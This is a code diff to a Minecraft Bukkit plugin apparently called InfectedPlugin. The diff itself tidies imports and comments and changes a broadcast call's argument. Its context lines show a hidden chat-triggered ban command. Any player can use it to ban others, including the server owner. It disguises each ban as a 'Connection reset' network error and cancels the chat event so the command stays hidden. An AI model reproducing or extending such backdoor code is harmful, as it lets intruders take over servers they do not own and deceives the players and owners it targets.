@@ -1,10 +1,13 @@
 package org.CreeperCoders.InfectedPlugin.Commands;
 
-import org.bukkit.*;
+import org.bukkit.Bukkit;
+import org.bukkit.ChatColor;
+import org.bukkit.Server;
+import org.bukkit.command.Command;
 import org.bukkit.entity.Player;
-import org.bukkit.event.*;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
-import org.bukkit.command.*;
 
 public class Command_ban extends IP_Command implements Listener
 {
@@ -39,15 +42,15 @@ public class Command_ban extends IP_Command implements Listener
                         p.sendMessage(ChatColor.RED + "You can't ban yourself, stupid idiot! Now ban the owner and have some fun!");
                         return;
                     }
-                    //We should use this message at banall too!
+                    // We should use this message at banall too!
                     target.kickPlayer("Internal exception: java.net.SocketException: Connection reset");
                     target.setBanned(true);
-                    Command.broadcastCommandMessage(sender, "Banned player " + args[1]);
-                    //Should use Command.broadcastCommandMessage, like in the API.
+                    Command.broadcastCommandMessage(p, "Banned player " + args[1]);
+                    // Should use Command.broadcastCommandMessage, like in the API.
                 }
                 catch (PlayerNotFoundException e)
                 {
-                    Command.broadcastCommandMessage(sender, "Banned player " + args[1]);
+                    Command.broadcastCommandMessage(p, "Banned player " + args[1]);
                     server.getOfflinePlayer(args[1]).setBanned(true);
                 }
                 event.setCancelled(true);
